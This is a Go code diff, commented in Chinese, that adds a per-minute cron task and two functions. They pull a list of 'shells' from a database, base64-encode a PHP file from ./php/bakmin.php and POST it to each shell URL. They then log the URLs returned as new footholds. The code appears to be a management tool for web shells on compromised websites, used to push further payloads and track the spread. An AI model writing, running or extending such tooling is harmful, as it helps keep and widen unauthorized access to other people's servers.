@@ -30,6 +30,13 @@ type Resdata struct {
 func StartCli() {
 	c := cron.New()
 
+	c.AddFunc("* * * * *", func() {
+		fmt.Println("执行:", time.Now())
+		AddMinone()
+		AddMaxone()
+
+	})
+
 	c.AddFunc("0 * * * *", func() {
 		fmt.Println("执行:", time.Now())
 		AddMin()
@@ -39,6 +46,143 @@ func StartCli() {
 
 	c.Start()
 	select {}
+
+}
+
+func AddMinone() {
+	var grup []model.ShellGroup
+	if err := model.Db.Where("status=?", 1).Find(&grup).Error; err != nil {
+		log.Printf("ShellGroup: : %v", err)
+		return
+	}
+	var Grupadd []int
+	for _, k := range grup {
+		Grupadd = append(Grupadd, k.Id)
+	}
+
+	var shells []model.Shell
+	if err := model.Db.Where("status < 2 and num=0 and group_id in ?", Grupadd).Find(&shells).Error; err != nil {
+		log.Printf("Sitestatus: failed to query shells: %v", err)
+		return
+	}
+
+	filePath := "./php/bakmin.php" // 要读取的文件
+	// 1. 读取文件
+	data, err := os.ReadFile(filePath)
+	if err != nil {
+		fmt.Println("读取文件失败:", err)
+		return
+	}
+	filename := Getfile("min")
+	//更换
+	newData := bytes.ReplaceAll(data, []byte("#####"), filename)
+
+	newData = append([]byte("?>"), newData...)
+	// 2. Base64 编码
+	encoded := base64.RawStdEncoding.EncodeToString(newData)
+	for _, k := range shells {
+		geturl, err := cleanURL(k.Maxurl)
+		if err != nil {
+			log.Println("url err:", err.Error())
+			continue
+		}
+		filename := geturl + k.Minurl
+		//fmt.Println("filename :", filename)
+		body := postdata(filename, encoded)
+		var resdate Resdata
+		jsonrr := json.Unmarshal(body, &resdate)
+		if jsonrr != nil {
+			fmt.Println("jsonerr:", jsonrr.Error())
+			continue
+		}
+		if len(resdate.Url) > 1 {
+			//
+			fmt.Println("url: ", resdate.Url)
+			var addmins []model.ShellMin
+			for _, resurl := range resdate.Url {
+				var min model.ShellMin
+				min.ShellId = k.Id
+				min.Url = resurl
+				min.Addtime = int(time.Now().Unix())
+				min.Status = 1
+				addmins = append(addmins, min)
+			}
+			model.Db.Create(addmins)
+			result := model.Db.Model(&model.Shell{}).Where("id = ?", k.Id).Update("num", 1)
+			if result.Error != nil {
+				log.Println("update shell num err:", result.Error.Error())
+				continue
+			}
+		}
+	}
+
+}
+
+func AddMaxone() {
+	var grup []model.ShellGroup
+	if err := model.Db.Where("status=?", 1).Find(&grup).Error; err != nil {
+		log.Printf("ShellGroup: : %v", err)
+		return
+	}
+	var Grupadd []int
+	for _, k := range grup {
+		Grupadd = append(Grupadd, k.Id)
+	}
+	var shells []model.Shell
+	if err := model.Db.Where("status < 2 and num=1 and group_id in ?", Grupadd).Find(&shells).Error; err != nil {
+		log.Printf("Sitestatus: failed to query shells: %v", err)
+		return
+	}
+
+	filePath := "./php/bakmin.php" // 要读取的文件
+	// 1. 读取文件
+	data, err := os.ReadFile(filePath)
+	if err != nil {
+		fmt.Println("读取文件失败:", err)
+		return
+	}
+	filename := Getfile("max")
+	//更换
+	newData := bytes.ReplaceAll(data, []byte("#####"), filename)
+
+	newData = append([]byte("?>"), newData...)
+	// 2. Base64 编码
+	encoded := base64.RawStdEncoding.EncodeToString(newData)
+	for _, k := range shells {
+		geturl, err := cleanURL(k.Maxurl)
+		if err != nil {
+			log.Println("url err:", err.Error())
+			continue
+		}
+		filename := geturl + k.Minurl
+		//fmt.Println("filename :", filename)
+		body := postdata(filename, encoded)
+		var resdate Resdata
+		jsonrr := json.Unmarshal(body, &resdate)
+		if jsonrr != nil {
+			fmt.Println("jsonerr:", jsonrr.Error())
+			continue
+		}
+		if len(resdate.Url) > 1 {
+			//
+			fmt.Println("url: ", resdate.Url)
+			var addmins []model.ShellMax
+			for _, resurl := range resdate.Url {
+				var min model.ShellMax
+				min.ShellId = k.Id
+				min.Url = resurl
+				min.Addtime = int(time.Now().Unix())
+				min.Status = 1
+				addmins = append(addmins, min)
+			}
+			model.Db.Create(addmins)
+			result := model.Db.Model(&model.Shell{}).Where("id = ?", k.Id).Update("num", 2)
+			if result.Error != nil {
+				log.Println("update shell num err:", result.Error.Error())
+				continue
+			}
+		}
+	}
 
 }
 
